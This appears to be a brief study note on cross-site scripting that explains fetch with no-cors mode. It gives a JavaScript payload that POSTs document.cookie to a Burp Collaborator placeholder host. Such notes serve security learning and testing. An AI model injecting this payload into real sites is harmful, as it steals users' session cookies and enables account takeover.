[XSS](XSS.md)

[Example](Example.md)

**mode: <no-cors>** only basic methods such as get post 

**fetch(’url’)** send data to this url

```javascript
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
```